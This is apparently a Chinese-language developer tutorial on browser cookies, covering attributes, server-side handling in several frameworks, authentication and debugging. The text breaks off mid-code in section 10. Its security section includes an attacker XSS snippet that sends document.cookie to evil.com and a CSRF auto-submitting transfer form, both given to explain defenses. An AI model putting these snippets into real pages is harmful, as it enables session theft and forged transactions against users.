> Cookie 是浏览器存储的一种机制，用于在客户端保存少量数据
> 本笔记从基础到进阶，全面覆盖 Cookie 的使用、安全性和最佳实践

---

## 目录

1. [基础概念](#1-基础概念)
2. [Cookie 的基本操作](#2-cookie-的基本操作)
3. [Cookie 属性详解](#3-cookie-属性详解)
4. [Cookie 的安全性](#4-cookie-的安全性)
5. [服务端 Cookie 操作](#5-服务端-cookie-操作)
6. [第三方 Cookie](#6-第三方-cookie)
7. [Cookie 与认证](#7-cookie-与认证)
8. [Cookie 工具库](#8-cookie-工具库)
9. [Cookie 与其他存储对比](#9-cookie-与其他存储对比)
10. [调试与测试](#10-调试与测试)
11. [最佳实践](#11-最佳实践)
12. [常见错误与解决方案](#12-常见错误与解决方案)

---

## 1. 基础概念

### 1.1 什么是 Cookie？

Cookie（HTTP Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据。浏览器会在后续请求中自动携带 Cookie 发送给服务器。

**Cookie 的主要用途**：
- **会话管理**：登录状态、购物车、游戏分数等
- **个性化**：用户偏好设置、主题选择等
- **追踪分析**：记录和分析用户行为

### 1.2 Cookie 的工作原理

```
1. 用户首次访问网站
   浏览器 ──────────────────────────────> 服务器
          GET /index.html HTTP/1.1

2. 服务器响应并设置 Cookie
   浏览器 <────────────────────────────── 服务器
          HTTP/1.1 200 OK
          Set-Cookie: sessionId=abc123; Path=/

3. 后续请求自动携带 Cookie
   浏览器 ──────────────────────────────> 服务器
          GET /api/user HTTP/1.1
          Cookie: sessionId=abc123
```

### 1.3 Cookie 的限制

| 限制项 | 说明 |
|--------|------|
| 大小限制 | 单个 Cookie 最大约 4KB |
| 数量限制 | 每个域名最多约 50 个 Cookie |
| 总大小限制 | 每个域名所有 Cookie 总计约 4KB |
| 同源策略 | Cookie 受同源策略限制 |
| 自动发送 | 每次请求都会自动发送，增加带宽消耗 |

### 1.4 Cookie 的组成

一个完整的 Cookie 包含以下部分：

```
name=value; Expires=date; Max-Age=seconds; Domain=domain; Path=path; Secure; HttpOnly; SameSite=value
```

| 组成部分 | 说明 | 示例 |
|----------|------|------|
| name=value | Cookie 的名称和值（必需） | `sessionId=abc123` |
| Expires | 过期时间（绝对时间） | `Expires=Thu, 01 Jan 2025 00:00:00 GMT` |
| Max-Age | 有效期（相对时间，秒） | `Max-Age=3600` |
| Domain | 可访问该 Cookie 的域名 | `Domain=.example.com` |
| Path | 可访问该 Cookie 的路径 | `Path=/api` |
| Secure | 仅通过 HTTPS 传输 | `Secure` |
| HttpOnly | 禁止 JavaScript 访问 | `HttpOnly` |
| SameSite | 跨站请求限制 | `SameSite=Strict` |

---

## 2. Cookie 的基本操作

### 2.1 读取 Cookie

```javascript
// 获取所有 Cookie（返回字符串）
const allCookies = document.cookie;
console.log(allCookies);
// 输出: "name=John; age=25; theme=dark"

// 解析 Cookie 为对象
function parseCookies() {
  const cookies = {};
  document.cookie.split(';').forEach(cookie => {
    const [name, value] = cookie.trim().split('=');
    if (name) {
      cookies[name] = decodeURIComponent(value || '');
    }
  });
  return cookies;
}

// 获取指定 Cookie
function getCookie(name) {
  const cookies = parseCookies();
  return cookies[name] || null;
}

// 使用示例
console.log(getCookie('sessionId')); // "abc123"
```

### 2.2 设置 Cookie

```javascript
// 基本设置
document.cookie = 'username=John';

// 设置带过期时间的 Cookie
document.cookie = 'username=John; max-age=3600'; // 1小时后过期

// 设置带路径的 Cookie
document.cookie = 'username=John; path=/';

// 完整设置
function setCookie(name, value, options = {}) {
  let cookie = `${encodeURIComponent(name)}=${encodeURIComponent(value)}`;
  
  if (options.maxAge) {
    cookie += `; max-age=${options.maxAge}`;
  }
  
  if (options.expires) {
    cookie += `; expires=${options.expires.toUTCString()}`;
  }
  
  if (options.path) {
    cookie += `; path=${options.path}`;
  }
  
  if (options.domain) {
    cookie += `; domain=${options.domain}`;
  }
  
  if (options.secure) {
    cookie += '; secure';
  }
  
  if (options.httpOnly) {
    // 注意：JavaScript 无法设置 HttpOnly，这只能由服务器设置
    console.warn('HttpOnly can only be set by server');
  }
  
  if (options.sameSite) {
    cookie += `; samesite=${options.sameSite}`;
  }
  
  document.cookie = cookie;
}

// 使用示例
setCookie('token', 'abc123', {
  maxAge: 7 * 24 * 60 * 60, // 7天
  path: '/',
  secure: true,
  sameSite: 'Strict'
});
```

### 2.3 删除 Cookie

```javascript
// 删除 Cookie（设置过期时间为过去）
function deleteCookie(name, options = {}) {
  const deleteOptions = {
    ...options,
    maxAge: -1, // 或设置 expires 为过去的时间
  };
  setCookie(name, '', deleteOptions);
}

// 简单删除
document.cookie = 'username=; max-age=-1';

// 删除指定路径的 Cookie
document.cookie = 'username=; max-age=-1; path=/';

// 删除指定域名的 Cookie
document.cookie = 'username=; max-age=-1; domain=.example.com; path=/';

// 使用示例
deleteCookie('token', { path: '/', domain: '.example.com' });
```

> **注意**：删除 Cookie 时，必须指定与设置时相同的 `path` 和 `domain`，否则无法删除。

### 2.4 修改 Cookie

```javascript
// 修改 Cookie 就是重新设置同名 Cookie
function updateCookie(name, value, options = {}) {
  setCookie(name, value, options);
}

// 示例：更新用户偏好
updateCookie('theme', 'light', { maxAge: 365 * 24 * 60 * 60, path: '/' });
```

### 2.5 完整的 Cookie 工具类

```javascript
/**
 * Cookie 工具类
 */
class CookieUtil {
  /**
   * 获取 Cookie
   * @param {string} name - Cookie 名称
   * @returns {string|null} Cookie 值
   */
  static get(name) {
    const cookies = document.cookie.split(';');
    for (let cookie of cookies) {
      const [cookieName, cookieValue] = cookie.trim().split('=');
      if (cookieName === name) {
        return decodeURIComponent(cookieValue);
      }
    }
    return null;
  }

  /**
   * 获取所有 Cookie
   * @returns {Object} Cookie 对象
   */
  static getAll() {
    const cookies = {};
    document.cookie.split(';').forEach(cookie => {
      const [name, value] = cookie.trim().split('=');
      if (name) {
        cookies[name] = decodeURIComponent(value || '');
      }
    });
    return cookies;
  }

  /**
   * 设置 Cookie
   * @param {string} name - Cookie 名称
   * @param {string} value - Cookie 值
   * @param {Object} options - 配置选项
   */
  static set(name, value, options = {}) {
    const {
      maxAge,
      expires,
      path = '/',
      domain,
      secure = false,
      sameSite = 'Lax'
    } = options;

    let cookie = `${encodeURIComponent(name)}=${encodeURIComponent(value)}`;

    if (maxAge !== undefined) {
      cookie += `; max-age=${maxAge}`;
    } else if (expires) {
      const expiresDate = expires instanceof Date ? expires : new Date(expires);
      cookie += `; expires=${expiresDate.toUTCString()}`;
    }

    cookie += `; path=${path}`;

    if (domain) {
      cookie += `; domain=${domain}`;
    }

    if (secure || location.protocol === 'https:') {
      cookie += '; secure';
    }

    cookie += `; samesite=${sameSite}`;

    document.cookie = cookie;
  }

  /**
   * 删除 Cookie
   * @param {string} name - Cookie 名称
   * @param {Object} options - 配置选项
   */
  static remove(name, options = {}) {
    this.set(name, '', { ...options, maxAge: -1 });
  }

  /**
   * 检查 Cookie 是否存在
   * @param {string} name - Cookie 名称
   * @returns {boolean}
   */
  static has(name) {
    return this.get(name) !== null;
  }

  /**
   * 清除所有 Cookie（当前路径）
   */
  static clear() {
    const cookies = this.getAll();
    Object.keys(cookies).forEach(name => {
      this.remove(name);
    });
  }
}

// 使用示例
CookieUtil.set('user', 'John', { maxAge: 3600 });
console.log(CookieUtil.get('user')); // "John"
console.log(CookieUtil.has('user')); // true
CookieUtil.remove('user');
```

---

## 3. Cookie 属性详解

### 3.1 Expires 和 Max-Age

这两个属性都用于设置 Cookie 的过期时间：

```javascript
// Expires：绝对过期时间
const expires = new Date();
expires.setTime(expires.getTime() + 24 * 60 * 60 * 1000); // 24小时后
document.cookie = `token=abc123; expires=${expires.toUTCString()}`;

// Max-Age：相对过期时间（秒）
document.cookie = 'token=abc123; max-age=86400'; // 24小时 = 86400秒

// 会话 Cookie（不设置过期时间，浏览器关闭后删除）
document.cookie = 'sessionToken=xyz789';

// 立即过期（删除 Cookie）
document.cookie = 'token=; max-age=0';
document.cookie = 'token=; max-age=-1';
```

**优先级**：如果同时设置了 `Expires` 和 `Max-Age`，`Max-Age` 优先。

**常用时间设置**：
```javascript
const TIME = {
  MINUTE: 60,
  HOUR: 60 * 60,
  DAY: 24 * 60 * 60,
  WEEK: 7 * 24 * 60 * 60,
  MONTH: 30 * 24 * 60 * 60,
  YEAR: 365 * 24 * 60 * 60
};

// 设置 7 天有效期
CookieUtil.set('remember', 'true', { maxAge: TIME.WEEK });
```

### 3.2 Domain 属性

`Domain` 属性指定哪些域名可以访问该 Cookie：

```javascript
// 设置 Domain
document.cookie = 'token=abc123; domain=.example.com; path=/';

// Domain 规则：
// 1. 不设置 Domain：只有当前域名可以访问
// 2. 设置 Domain=example.com：example.com 及其子域名都可以访问
// 3. 设置 Domain=.example.com：同上（前导点可选）
```

**Domain 示例**：

| 设置的 Domain | 可访问的域名 |
|---------------|--------------|
| 不设置 | 仅 `www.example.com` |
| `example.com` | `example.com`, `www.example.com`, `api.example.com` |
| `.example.com` | 同上 |
| `api.example.com` | 仅 `api.example.com` |

```javascript
// 跨子域名共享 Cookie
// 在 www.example.com 设置
document.cookie = 'sharedToken=xyz; domain=.example.com; path=/';

// 在 api.example.com 可以读取
console.log(document.cookie); // 包含 sharedToken=xyz
```

> **安全提示**：不能设置与当前域名不相关的 Domain，例如在 `example.com` 不能设置 `domain=other.com`。

### 3.3 Path 属性

`Path` 属性指定哪些路径可以访问该 Cookie：

```javascript
// 设置 Path
document.cookie = 'token=abc123; path=/admin';

// Path 规则：
// 1. path=/：所有路径都可以访问
// 2. path=/admin：只有 /admin 及其子路径可以访问
// 3. 不设置：默认为当前路径
```

**Path 示例**：

| 设置的 Path | 可访问的路径 |
|-------------|--------------|
| `/` | 所有路径 |
| `/admin` | `/admin`, `/admin/users`, `/admin/settings` |
| `/api/v1` | `/api/v1`, `/api/v1/users` |

```javascript
// 不同路径的 Cookie 可以同名
document.cookie = 'token=user123; path=/user';
document.cookie = 'token=admin456; path=/admin';

// 在 /user 路径下
console.log(document.cookie); // token=user123

// 在 /admin 路径下
console.log(document.cookie); // token=admin456

// 在根路径下
console.log(document.cookie); // 可能都看不到，取决于当前路径
```

### 3.4 Secure 属性

`Secure` 属性指定 Cookie 只能通过 HTTPS 协议传输：

```javascript
// 设置 Secure Cookie
document.cookie = 'sensitiveData=secret; secure';

// 完整示例
document.cookie = 'authToken=abc123; secure; path=/';
```

**Secure 特性**：
- 只在 HTTPS 连接中发送
- HTTP 页面无法设置 Secure Cookie（Chrome 52+ 限制）
- 本地开发时 `localhost` 是例外，可以设置 Secure Cookie

```javascript
// 根据协议自动设置 Secure
function setSecureCookie(name, value, options = {}) {
  const isSecure = location.protocol === 'https:' || location.hostname === 'localhost';
  CookieUtil.set(name, value, { ...options, secure: isSecure });
}
```

### 3.5 HttpOnly 属性

`HttpOnly` 属性禁止 JavaScript 访问 Cookie，只能由服务器设置和读取：

```javascript
// ❌ JavaScript 无法设置 HttpOnly
document.cookie = 'token=abc123; httponly'; // 无效

// ✅ 只能由服务器设置
// HTTP 响应头
// Set-Cookie: token=abc123; HttpOnly; Path=/
```

**HttpOnly 的作用**：
- 防止 XSS 攻击窃取 Cookie
- 敏感信息（如 Session ID）应该设置 HttpOnly
- JavaScript 的 `document.cookie` 无法读取 HttpOnly Cookie

```javascript
// 服务端设置示例（Node.js Express）
res.cookie('sessionId', 'abc123', {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});
```

### 3.6 SameSite 属性

`SameSite` 属性控制 Cookie 在跨站请求时是否发送，是防止 CSRF 攻击的重要手段：

```javascript
// SameSite 三个值
document.cookie = 'token=abc; samesite=Strict';  // 最严格
document.cookie = 'token=abc; samesite=Lax';     // 默认值（Chrome 80+）
document.cookie = 'token=abc; samesite=None; secure'; // 允许跨站
```

**SameSite 值详解**：

| 值 | 说明 | 跨站请求 | 适用场景 |
|----|------|----------|----------|
| `Strict` | 完全禁止跨站发送 | ❌ 不发送 | 银行、支付等高安全场景 |
| `Lax` | 允许安全的跨站请求 | 部分发送 | 大多数网站（默认） |
| `None` | 允许所有跨站请求 | ✅ 发送 | 第三方服务、嵌入式内容 |

**Lax 模式下的请求行为**：

| 请求类型 | 示例 | Cookie 发送 |
|----------|------|-------------|
| 链接跳转 | `<a href="...">` | ✅ 发送 |
| 预加载 | `<link rel="prerender">` | ✅ 发送 |
| GET 表单 | `<form method="GET">` | ✅ 发送 |
| POST 表单 | `<form method="POST">` | ❌ 不发送 |
| iframe | `<iframe src="...">` | ❌ 不发送 |
| AJAX | `fetch()`, `XMLHttpRequest` | ❌ 不发送 |
| 图片 | `<img src="...">` | ❌ 不发送 |

```javascript
// 不同场景的 SameSite 设置

// 1. 用户认证 Cookie（推荐 Strict）
document.cookie = 'authToken=xxx; samesite=Strict; secure; path=/';

// 2. 用户偏好设置（Lax 即可）
document.cookie = 'theme=dark; samesite=Lax; path=/';

// 3. 第三方追踪/分析（必须 None + Secure）
document.cookie = 'trackingId=xxx; samesite=None; secure; path=/';
```

> **重要**：`SameSite=None` 必须同时设置 `Secure`，否则 Cookie 会被拒绝。

---

## 4. Cookie 的安全性

### 4.1 XSS 攻击防护

XSS（跨站脚本攻击）可以通过注入恶意脚本窃取 Cookie：

```javascript
// ❌ 攻击者注入的恶意代码
<script>
  // 窃取 Cookie 并发送到攻击者服务器
  new Image().src = 'https://evil.com/steal?cookie=' + document.cookie;
</script>
```

**防护措施**：

```javascript
// 1. 使用 HttpOnly（服务端设置）
// Set-Cookie: sessionId=abc123; HttpOnly

// 2. 对用户输入进行转义
function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

// 3. 使用 Content-Security-Policy
// Content-Security-Policy: script-src 'self'

// 4. 不在 Cookie 中存储敏感信息
// ❌ 错误
document.cookie = 'password=123456';
// ✅ 正确：只存储 token，敏感信息存服务端
document.cookie = 'sessionId=abc123';
```

### 4.2 CSRF 攻击防护

CSRF（跨站请求伪造）利用用户已登录的身份发起恶意请求：

```html
<!-- 攻击者网站上的恶意表单 -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
```

**防护措施**：

```javascript
// 1. 使用 SameSite 属性
document.cookie = 'sessionId=abc123; samesite=Strict';

// 2. CSRF Token（服务端生成，前端携带）
// 服务端设置
// Set-Cookie: csrfToken=xyz789; SameSite=Strict

// 前端请求时携带
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': getCookie('csrfToken')
  },
  body: JSON.stringify({ to: 'friend', amount: 100 })
});

// 3. 验证 Referer/Origin 头
// 服务端检查请求来源

// 4. 双重 Cookie 验证
// 将 Cookie 值同时放在请求头或请求体中
```

### 4.3 Cookie 劫持防护

```javascript
// 1. 始终使用 HTTPS
// 防止中间人攻击窃取 Cookie

// 2. 设置 Secure 属性
document.cookie = 'token=abc123; secure';

// 3. 定期轮换 Session ID
// 登录后生成新的 Session ID

// 4. 绑定 IP 或设备指纹
// 服务端验证请求来源
```

### 4.4 安全 Cookie 设置模板

```javascript
// 最安全的 Cookie 设置
function setSecureCookie(name, value, days = 7) {
  const maxAge = days * 24 * 60 * 60;
  
  // 生产环境
  if (location.protocol === 'https:') {
    document.cookie = `${name}=${encodeURIComponent(value)}; ` +
      `max-age=${maxAge}; ` +
      `path=/; ` +
      `secure; ` +
      `samesite=Strict`;
  } else {
    // 开发环境（localhost）
    document.cookie = `${name}=${encodeURIComponent(value)}; ` +
      `max-age=${maxAge}; ` +
      `path=/; ` +
      `samesite=Lax`;
  }
}

// 服务端安全设置示例（Node.js）
const cookieOptions = {
  httpOnly: true,      // 防止 XSS
  secure: true,        // 仅 HTTPS
  sameSite: 'strict',  // 防止 CSRF
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7天
  path: '/',
  domain: '.example.com'
};

res.cookie('sessionId', sessionId, cookieOptions);
```

---

## 5. 服务端 Cookie 操作

### 5.1 Node.js (Express)

```javascript
const express = require('express');
const cookieParser = require('cookie-parser');

const app = express();
app.use(cookieParser('secret-key')); // 用于签名 Cookie

// 设置 Cookie
app.get('/login', (req, res) => {
  // 普通 Cookie
  res.cookie('username', 'John', {
    maxAge: 24 * 60 * 60 * 1000, // 1天
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict'
  });
  
  // 签名 Cookie（防篡改）
  res.cookie('userId', '12345', {
    signed: true,
    httpOnly: true
  });
  
  res.send('Cookie 已设置');
});

// 读取 Cookie
app.get('/profile', (req, res) => {
  // 普通 Cookie
  const username = req.cookies.username;
  
  // 签名 Cookie
  const userId = req.signedCookies.userId;
  
  res.json({ username, userId });
});

// 删除 Cookie
app.get('/logout', (req, res) => {
  res.clearCookie('username');
  res.clearCookie('userId');
  res.send('已登出');
});
```

### 5.2 Python (Flask)

```python
from flask import Flask, request, make_response
from datetime import datetime, timedelta

app = Flask(__name__)

@app.route('/login')
def login():
    resp = make_response('Cookie 已设置')
    
    # 设置 Cookie
    resp.set_cookie(
        'username',
        'John',
        max_age=86400,  # 1天
        httponly=True,
        secure=True,
        samesite='Strict'
    )
    
    # 设置带过期时间的 Cookie
    expires = datetime.now() + timedelta(days=7)
    resp.set_cookie('remember', 'true', expires=expires)
    
    return resp

@app.route('/profile')
def profile():
    # 读取 Cookie
    username = request.cookies.get('username')
    return f'Hello, {username}'

@app.route('/logout')
def logout():
    resp = make_response('已登出')
    # 删除 Cookie
    resp.delete_cookie('username')
    return resp
```

### 5.3 Java (Spring Boot)

```java
import org.springframework.web.bind.annotation.*;
import javax.servlet.http.*;

@RestController
public class CookieController {
    
    @GetMapping("/login")
    public String login(HttpServletResponse response) {
        // 创建 Cookie
        Cookie cookie = new Cookie("username", "John");
        cookie.setMaxAge(86400); // 1天
        cookie.setPath("/");
        cookie.setHttpOnly(true);
        cookie.setSecure(true);
        
        response.addCookie(cookie);
        return "Cookie 已设置";
    }
    
    @GetMapping("/profile")
    public String profile(@CookieValue(value = "username", defaultValue = "Guest") String username) {
        return "Hello, " + username;
    }
    
    @GetMapping("/logout")
    public String logout(HttpServletResponse response) {
        Cookie cookie = new Cookie("username", null);
        cookie.setMaxAge(0); // 立即过期
        cookie.setPath("/");
        response.addCookie(cookie);
        return "已登出";
    }
}
```

### 5.4 Go (Gin)

```go
package main

import (
    "github.com/gin-gonic/gin"
    "net/http"
)

func main() {
    r := gin.Default()
    
    // 设置 Cookie
    r.GET("/login", func(c *gin.Context) {
        c.SetCookie(
            "username",     // name
            "John",         // value
            86400,          // maxAge (秒)
            "/",            // path
            "example.com",  // domain
            true,           // secure
            true,           // httpOnly
        )
        c.String(http.StatusOK, "Cookie 已设置")
    })
    
    // 读取 Cookie
    r.GET("/profile", func(c *gin.Context) {
        username, err := c.Cookie("username")
        if err != nil {
            username = "Guest"
        }
        c.String(http.StatusOK, "Hello, %s", username)
    })
    
    // 删除 Cookie
    r.GET("/logout", func(c *gin.Context) {
        c.SetCookie("username", "", -1, "/", "example.com", true, true)
        c.String(http.StatusOK, "已登出")
    })
    
    r.Run(":8080")
}
```

---

## 6. 第三方 Cookie

### 6.1 什么是第三方 Cookie？

第三方 Cookie 是由当前访问网站以外的域名设置的 Cookie：

```
用户访问 example.com
├── example.com 设置的 Cookie → 第一方 Cookie
├── ads.google.com 设置的 Cookie → 第三方 Cookie
└── analytics.facebook.com 设置的 Cookie → 第三方 Cookie
```

### 6.2 第三方 Cookie 的用途

- **广告追踪**：跨网站追踪用户行为
- **社交媒体**：嵌入的分享按钮、评论系统
- **分析服务**：Google Analytics 等
- **单点登录**：跨域身份认证

### 6.3 第三方 Cookie 的限制

现代浏览器正在逐步限制第三方 Cookie：

| 浏览器 | 策略 |
|--------|------|
| Safari | 默认阻止所有第三方 Cookie |
| Firefox | 默认阻止追踪性第三方 Cookie |
| Chrome | 计划 2024 年后逐步淘汰 |
| Edge | 跟随 Chrome 策略 |

```javascript
// 检测第三方 Cookie 是否可用
async function checkThirdPartyCookies() {
  try {
    // 创建一个隐藏的 iframe 指向第三方域名
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.src = 'https://third-party.com/cookie-check';
    document.body.appendChild(iframe);
    
    // 等待 iframe 加载并检查 Cookie
    // 实际实现需要跨域通信
  } catch (error) {
    console.log('第三方 Cookie 被阻止');
  }
}
```

### 6.4 第三方 Cookie 替代方案

```javascript
// 1. 使用第一方 Cookie + 服务端代理
// 前端请求自己的服务器，服务器再请求第三方

// 2. 使用 localStorage + postMessage
// 跨域通信
window.addEventListener('message', (event) => {
  if (event.origin === 'https://trusted-domain.com') {
    const data = event.data;
    localStorage.setItem('sharedData', data);
  }
});

// 3. 使用 Privacy Sandbox API（Chrome）
// Topics API, Attribution Reporting API 等

// 4. 使用服务端 Session
// 将状态存储在服务端，通过第一方 Cookie 关联
```

---

## 7. Cookie 与认证

### 7.1 基于 Cookie 的认证流程

```javascript
// 1. 用户登录
async function login(username, password) {
  const response = await fetch('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password }),
    credentials: 'include' // 重要：允许发送和接收 Cookie
  });
  
  if (response.ok) {
    // 服务器设置 Cookie: Set-Cookie: sessionId=xxx; HttpOnly; Secure
    console.log('登录成功');
  }
}

// 2. 发送认证请求
async function fetchProtectedData() {
  const response = await fetch('/api/protected', {
    credentials: 'include' // 自动携带 Cookie
  });
  return response.json();
}

// 3. 登出
async function logout() {
  await fetch('/api/logout', {
    method: 'POST',
    credentials: 'include'
  });
  // 服务器清除 Cookie
}
```

### 7.2 Cookie vs Token 认证

| 特性 | Cookie 认证 | Token 认证 (JWT) |
|------|-------------|------------------|
| 存储位置 | 浏览器自动管理 | 需手动存储 |
| 发送方式 | 自动发送 | 手动添加到请求头 |
| 跨域支持 | 需要配置 | 天然支持 |
| CSRF 风险 | 较高 | 较低 |
| XSS 风险 | HttpOnly 可防护 | 存 localStorage 有风险 |
| 服务端状态 | 有状态（Session） | 无状态 |
| 移动端支持 | 较差 | 较好 |

```javascript
// Cookie 认证
fetch('/api/data', {
  credentials: 'include'
});

// Token 认证
fetch('/api/data', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});

// 混合方案：Token 存在 HttpOnly Cookie 中
// 服务端设置
// Set-Cookie: accessToken=xxx; HttpOnly; Secure; SameSite=Strict
```

### 7.3 记住我功能

```javascript
// 前端
async function login(username, password, rememberMe) {
  const response = await fetch('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password, rememberMe }),
    credentials: 'include'
  });
  
  // 服务器根据 rememberMe 设置不同的 Cookie 有效期
  // rememberMe=true: max-age=30天
  // rememberMe=false: 会话 Cookie
}

// 服务端 (Node.js)
app.post('/api/login', (req, res) => {
  const { username, password, rememberMe } = req.body;
  
  // 验证用户...
  
  const cookieOptions = {
    httpOnly: true,
    secure: true,
    sameSite: 'strict',
    path: '/'
  };
  
  if (rememberMe) {
    cookieOptions.maxAge = 30 * 24 * 60 * 60 * 1000; // 30天
  }
  // 不设置 maxAge 则为会话 Cookie
  
  res.cookie('sessionId', sessionId, cookieOptions);
  res.json({ success: true });
});
```

### 7.4 刷新 Token 机制

```javascript
// 双 Token 机制
// Access Token: 短期有效（15分钟）
// Refresh Token: 长期有效（7天），存在 HttpOnly Cookie 中

async function fetchWithRefresh(url, options = {}) {
  let response = await fetch(url, {
    ...options,
    credentials: 'include'
  });
  
  // Access Token 过期
  if (response.status === 401) {
    // 尝试刷新 Token
    const refreshResponse = await fetch('/api/refresh', {
      method: 'POST',
      credentials: 'include'
    });
    
    if (refreshResponse.ok) {
      // 重试原请求
      response = await fetch(url, {
        ...options,
        credentials: 'include'
      });
    } else {
      // Refresh Token 也过期，需要重新登录
      window.location.href = '/login';
    }
  }
  
  return response;
}
```

---

## 8. Cookie 工具库

### 8.1 js-cookie

最流行的 Cookie 操作库：

```bash
npm install js-cookie
```

```javascript
import Cookies from 'js-cookie';

// 设置 Cookie
Cookies.set('name', 'John');
Cookies.set('name', 'John', { expires: 7 }); // 7天后过期
Cookies.set('name', 'John', { expires: 7, path: '/' });

// 设置完整选项
Cookies.set('name', 'John', {
  expires: 7,
  path: '/',
  domain: '.example.com',
  secure: true,
  sameSite: 'strict'
});

// 读取 Cookie
const name = Cookies.get('name'); // 'John'
const allCookies = Cookies.get(); // { name: 'John', ... }

// 删除 Cookie
Cookies.remove('name');
Cookies.remove('name', { path: '/', domain: '.example.com' });

// JSON 支持
Cookies.set('user', { name: 'John', age: 25 });
const user = Cookies.get('user'); // '{"name":"John","age":25}'

// 使用 JSON 扩展
const userObj = JSON.parse(Cookies.get('user'));
```

### 8.2 universal-cookie

支持服务端渲染的 Cookie 库：

```bash
npm install universal-cookie
```

```javascript
import Cookies from 'universal-cookie';

const cookies = new Cookies();

// 设置
cookies.set('name', 'John', { path: '/' });

// 读取
const name = cookies.get('name');

// 删除
cookies.remove('name');

// React 中使用
import { CookiesProvider, useCookies } from 'react-cookie';

function App() {
  return (
    <CookiesProvider>
      <MyComponent />
    </CookiesProvider>
  );
}

function MyComponent() {
  const [cookies, setCookie, removeCookie] = useCookies(['name']);
  
  return (
    <div>
      <p>Name: {cookies.name}</p>
      <button onClick={() => setCookie('name', 'John', { path: '/' })}>
        设置 Cookie
      </button>
      <button onClick={() => removeCookie('name')}>
        删除 Cookie
      </button>
    </div>
  );
}
```

### 8.3 Vue 中使用 Cookie

```bash
npm install vue-cookies
```

```javascript
// main.js
import { createApp } from 'vue';
import VueCookies from 'vue-cookies';

const app = createApp(App);
app.use(VueCookies);
app.mount('#app');

// 组件中使用
export default {
  mounted() {
    // 设置
    this.$cookies.set('name', 'John', '7d'); // 7天
    
    // 读取
    const name = this.$cookies.get('name');
    
    // 删除
    this.$cookies.remove('name');
    
    // 检查是否存在
    const exists = this.$cookies.isKey('name');
  }
};

// Composition API
import { useCookies } from 'vue3-cookies';

export default {
  setup() {
    const { cookies } = useCookies();
    
    const setName = () => {
      cookies.set('name', 'John');
    };
    
    const getName = () => {
      return cookies.get('name');
    };
    
    return { setName, getName };
  }
};
```

---

## 9. Cookie 与其他存储对比

### 9.1 存储方式对比

| 特性 | Cookie | localStorage | sessionStorage | IndexedDB |
|------|--------|--------------|----------------|-----------|
| 容量 | ~4KB | ~5MB | ~5MB | 无限制 |
| 过期时间 | 可设置 | 永久 | 会话结束 | 永久 |
| 服务端访问 | ✅ 自动发送 | ❌ | ❌ | ❌ |
| 同源策略 | 可跨子域 | 严格同源 | 严格同源 | 严格同源 |
| 存储类型 | 字符串 | 字符串 | 字符串 | 任意类型 |
| 同步/异步 | 同步 | 同步 | 同步 | 异步 |

### 9.2 使用场景选择

```javascript
// Cookie：需要服务端访问的数据
// - 用户认证信息
// - 会话标识
// - 用户偏好（需要服务端知道）
document.cookie = 'sessionId=abc123; httponly; secure';

// localStorage：持久化的客户端数据
// - 用户设置
// - 缓存数据
// - 草稿内容
localStorage.setItem('theme', 'dark');
localStorage.setItem('draft', JSON.stringify(draftContent));

// sessionStorage：临时的会话数据
// - 表单数据
// - 页面状态
// - 一次性数据
sessionStorage.setItem('formData', JSON.stringify(formData));

// IndexedDB：大量结构化数据
// - 离线数据
// - 文件缓存
// - 复杂查询需求
const db = await openDB('myDB', 1);
await db.put('store', { id: 1, data: largeData });
```

### 9.3 混合使用策略

```javascript
// 认证系统示例
class AuthStorage {
  // Session ID 存 Cookie（服务端需要）
  setSession(sessionId) {
    document.cookie = `sessionId=${sessionId}; path=/; secure; samesite=strict`;
  }
  
  // 用户信息存 localStorage（客户端缓存）
  setUserInfo(user) {
    localStorage.setItem('userInfo', JSON.stringify(user));
  }
  
  // 临时状态存 sessionStorage
  setTempState(state) {
    sessionStorage.setItem('tempState', JSON.stringify(state));
  }
  
  // 清除所有认证数据
  clearAll() {
    document.cookie = 'sessionId=; max-age=-1; path=/';
    localStorage.removeItem('userInfo');
    sessionStorage.removeItem('tempState');
  }
}
```

---

## 10. 调试与测试

### 10.1 浏览器开发者工具

```javascript
// Chrome DevTools
// 1. 打开 DevTools (F12)
// 2. Application 标签 → Cookies
// 3. 可以查看、编辑、删除 Cookie

// 查看 Cookie
console.log(document.cookie);

// 查看所有 Cookie（包括 HttpOnly）
// 只能在 DevTools 的 Application 面板中查看
```

### 10.2 Cookie 调试技巧

```javascript
// 1. 打印所有 Cookie
function debugCookies() {
  console.table(
    document.cookie.split(';').map(c => {
      const [name, value] = c.trim().split('=');
      return { name, value: decodeURIComponent(value || '') };
    })
  );
}

// 2. 监控 Cookie 变化
let lastCookie = document.cookie;
setInterval(() => {
  if (document.cookie !== lastCookie) {
    console.log('Cookie 变化:', {
      before: lastCookie,
      after: document.cookie
    });
    lastCookie = document.cookie;
  }
}, 1000);

// 3. Cookie 变化事件（实验性 API）
if ('cookieStore' in window) {
  cookieStore.addEventListener('change', (event) => {
    console.log('Cookie 变化:', event.changed, event.deleted);
  });
}
```

### 10.3 Cookie Store API（现代 API）

```javascript
// Cookie Store API 提供了更现代的 Cookie 操作方式
// 注意：目前仅 Chrome 支持

// 检查支持
if ('cookieStore' in window) {
  // 读取 Cookie
  const cookie = await cookieStore.get('name');
  console.log(cookie); // { name: 'name', value: 'John', ... }
  
  // 读取所有 Cookie
  const allCookies = await cookieStore.getAll();
  
  // 设置 Cookie
  await cookieStore.set({
    name: 'name',
    value: 'John',
    expires: Date.now() + 24 * 60 * 60 * 1000,
    path: '/',
    sameSite: 'strict'
  });
  
  // 简单设置
  await cookieStore.set('name', 'John');
  
  // 删除 Cookie
  await cookieStore.delete('name');
  
  // 监听变化
  cookieStore.addEventListener('change', (event) => {
    for (const cookie of event.changed) {
      console.log('Cookie 更新:', cookie.name, cookie.value);
